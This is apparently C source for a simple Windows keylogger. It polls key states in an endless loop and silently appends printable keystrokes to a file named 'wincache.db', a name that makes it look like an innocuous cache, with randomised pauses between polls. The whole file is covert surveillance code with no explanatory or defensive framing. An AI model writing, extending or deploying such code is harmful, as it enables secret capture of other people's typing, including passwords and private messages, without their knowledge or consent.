#include <windows.h>
#include <stdlib.h>
#include <time.h>

int main() {
    HANDLE f;
    DWORD w;
    char c;

    srand((unsigned int)time(0));

    f = CreateFileA("wincache.db", FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (f == INVALID_HANDLE_VALUE) {
        return 1;
    }

    while (1) {
        for (short k = 8; k < 256; k++) {
            SHORT s = GetAsyncKeyState(k);
            if ((s & 1) && k >= 32 && k <= 126) {  
                c = (char)k;
                WriteFile(f, &c, 1, &w, 0);
            }
        }
        Sleep((30 + (rand() % 31)) * 1000);  
    }

    CloseHandle(f);
    return 0;
}
// 0, = NULL